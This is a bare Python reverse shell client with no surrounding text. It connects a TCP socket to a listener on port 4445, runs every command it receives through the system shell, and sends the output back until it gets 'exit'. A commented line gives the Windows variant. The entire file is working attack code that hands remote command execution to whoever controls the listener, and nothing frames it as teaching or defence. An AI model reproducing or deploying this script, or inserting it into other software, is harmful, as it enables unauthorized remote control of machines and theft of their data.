import socket 
import subprocess

def main():
    clinet=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
    clinet.connect(('0.0.0.0',4445))
    while True:
        command=clinet.recv(2096).decode()
        if command.lower() == 'exit':
            break
       # output=subprocess.Popen(command,shell=True,stdout=subprocess.PIPE,stderr=subprocess.PIPE) #For windows
        output=subprocess.getoutput(command)
        clinet.send(output.encode())
    clinet.close()
if __name__ == '__main__':
    main()
